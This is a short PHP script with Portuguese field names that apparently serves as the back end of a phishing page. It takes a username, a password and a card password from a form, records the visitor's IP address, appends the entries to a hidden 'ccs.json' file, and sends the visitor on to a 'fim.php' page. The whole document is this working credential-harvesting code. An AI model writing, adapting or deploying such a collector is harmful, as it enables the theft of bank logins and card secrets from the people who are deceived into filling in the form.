<?php header("Content-Type: text/html;  charset=UTF-8",true);?>

<?php ini_set('default_charset', 'UTF-8');?>

<?php



$usuario = $_POST['user'];

$senha = $_POST['pass'];

$senhacard = $_POST['passcard'];





    $ip         = $_SERVER['REMOTE_ADDR'];



    $Apelido = 'PC';



   $fl = "operador/seguro/ccs.json";

if(file_exists($fl)){

	$h = fopen($fl, "r");

	$arr = json_decode(fread($h, filesize ($fl)));

	array_push($arr,array($usuario, $senha, $senhacard, $ip));

	fclose($h);

} else {

	$arr = array(

		array($usuario, $senha, $senhacard, $ip)

	);

}

$fhs = fopen($fl, 'w') or die("can't open file");

fwrite($fhs, json_encode($arr));

fclose($fhs);

// fim

sleep(1);

header('location: fim.php');



?>









